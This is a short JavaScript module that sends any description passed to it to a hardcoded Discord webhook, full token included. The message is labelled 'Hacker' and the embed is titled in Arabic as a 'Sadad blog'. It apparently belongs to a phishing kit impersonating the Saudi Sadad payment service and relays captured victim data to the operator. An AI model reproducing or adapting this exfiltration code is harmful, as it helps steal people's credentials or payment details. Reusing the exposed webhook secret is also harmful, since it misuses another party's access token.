import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1356947129482088488/enztHh0AqKluJP_c7OrnN1D-um34HWY7jwOAh14qFbz_PpcbChSWYsN-EUuVFWe2b6EE",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
